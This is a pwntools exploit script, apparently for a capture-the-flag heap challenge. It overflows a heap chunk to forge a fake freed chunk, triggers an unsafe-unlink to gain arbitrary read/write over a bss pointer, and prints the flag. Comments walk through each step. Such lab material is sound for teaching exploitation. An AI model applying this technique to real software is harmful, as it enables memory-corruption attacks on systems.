from pwn import * 

binary = './toddlerheap_level5.0_patched'

p = process(binary)

s = '''
b mallo c
b free
'''


p.recvuntil("Reading the flag into ")
leak = int(p.recvuntil(".", drop = True).decode(), 16)

print(hex(leak))

p.sendline("malloc 0 1060")
p.sendline("malloc 1 1060")




p.sendline("read 0 3000")

# primitive :
#heap buffer overflow, no PIE or PIE defeated, chunks being pointed to by a bss address, chunk size > 0x420 (?) (unsortedbin chunk (? )
# 

# creating a fake chunk within a real chunk, we call that real chunk as chunk 0
# this fake chunk pretends to be a "freed" chunk
# with carefully written fd and bk pointer (that adds a certian offset i.e. 0x18, 0x10, that points back to the bss address which points to the data section of the real chunk)

# simultaneously, overwrite the prev_size of next chunk (chunk1) to shrink it by 0x10 bytes to point to starting header of fake chunk, the starting point data section of our real chunk (chunk0)

# again smultaneously with the buffer overflow, we overflow the flag bits of the size field of chunk1, to be 0. So that it thinks chunk0 is indeed freed


p.sendline(p64(0) + p64(0x421) + p64(0x404140 - 0x18) + p64(0x404140 - 0x10) + b'\x00' * 0x400 + p64(0x420) + p64(0x430))


# now that we free chunk1, it is going to "consolidate (combine)" with the previous chunk 
# when it consolidate, the chunk is going to unlink (?
p.sendline("free 1") # unlink 
# after unlinking, the pointer 0x404140, which originally was pointing the fake chunk, now points to 0x18 bytes behind itself i.e. 0x404128

# now we get arbitrary read/write (for once)
# because 0x404140 has in fact been pointing to the data section of a real chunk, chunk0
# now 0x404140 overwritten to 0x404128 becomes the new starting location of data section of the real chunk
# if we write something to the real chunk (chunk0), it starts writing from 0x404128
# eventually if we write more than 0x18 bytes, it will reach back to 0x404140
# and if we write a pointer to 0x404140, the pointer that points to a certain new location, would replace 0x404128 and become the again, a new starting location of the data section of our real chunk (chunk0)


gdb.attach(p, s)

p.sendline("read 0 3000") 
p.sendline(b'A' * 24 + p64(leak))

p.sendline("puts 0")


p.interactive()

